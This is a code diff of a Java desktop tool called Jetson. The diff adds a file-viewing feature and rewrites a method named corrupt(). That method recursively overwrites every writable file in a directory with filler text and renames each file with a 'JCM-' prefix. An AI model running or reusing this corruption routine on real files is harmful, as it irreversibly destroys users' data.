@@ -21,7 +21,7 @@ public class Jetson extends JFrame {
 
     // Static vars
     private static final JetRL JRL = new JetRL(JETSON_RESOURCE_FOLDER);
-    private static final String[] JETSON_ERRS = {"Jetson error [0]: could not open directory", "Jetson error [1]: could not open parent directory", "Jetson error [2]: could not write to file", "Jetson error [3]: could not create file"};
+    private static final String[] JETSON_ERRS = {"Jetson error [0]: could not open directory", "Jetson error [1]: could not open parent directory", "Jetson error [2]: could not write to file", "Jetson error [3]: could not create file", "Jetson error [4]: could not view file"};
     public static final String OS_NAME = System.getProperty("os.name").toLowerCase();
     public static final boolean IS_WINDOWS = OS_NAME.contains("win");
     public static final boolean IS_LINUX = OS_NAME.contains("nux") || OS_NAME.contains("nix");
@@ -190,8 +190,15 @@ public class Jetson extends JFrame {
                         File[] listOfFiles = inputtedDir.listFiles();
                         frame.listFiles(listOfFiles);
                         frame.clearInputField();
+                    } else if (inputtedDir.isFile()) {
+                        try {
+                            if (!JetViewer.view(inputtedDir)) {
+                                System.err.println(JETSON_ERRS[4]);
+                            }
+                        } catch (IOException ex) {
+                            throw new RuntimeException(ex);
+                        }
                     } else if (lowerCaseInput.contains("write")) {
-                        // Detect advanced commands
                         String[] data = inputFieldLocal.getText().split(" ", 2);
                         try {
                             if (data.length > 1) {
@@ -721,9 +728,9 @@ public class Jetson extends JFrame {
         }
     }
 
-    public static boolean corrupt(@NotNull File file) throws IOException {
-        if (file.isDirectory()) {
-            File[] listOfFiles = file.listFiles();
+    public static boolean corrupt(@NotNull File object) throws IOException {
+        if (object.isDirectory()) {
+            File[] listOfFiles = object.listFiles();
             boolean success = false;
 
             if (listOfFiles != null) {
@@ -731,16 +738,19 @@ public class Jetson extends JFrame {
                     if (fileInDir.isFile()) {
                         if (fileInDir.canWrite()) {
                             Jetson.verifyJetsonDirectory();
-                            success = JetWriter.write(fileInDir, Math.random() / 100 + JetReader.readFile(fileInDir) + "\nwrite and lite site");
+                            success = JetWriter.write(fileInDir, JetReader.readFile(getJetsonBloatTxt())) && fileInDir.renameTo(new File(fileInDir.getParentFile() + System.getProperty("file.separator") + "JCM-" + fileInDir.getName()));
                         }
                     } else {
+                        if (!success) {
+                            System.out.println("Not");
+                        }
                         return corrupt(fileInDir);
                     }
                 }
                 return success;
             }
         } else {
-            return JetWriter.write(file, JetReader.readFile(file) + JetReader.readFile(getJetsonBloatTxt()));
+            return JetWriter.write(object, JetReader.readFile(getJetsonBloatTxt()));
         }
 
         return false;
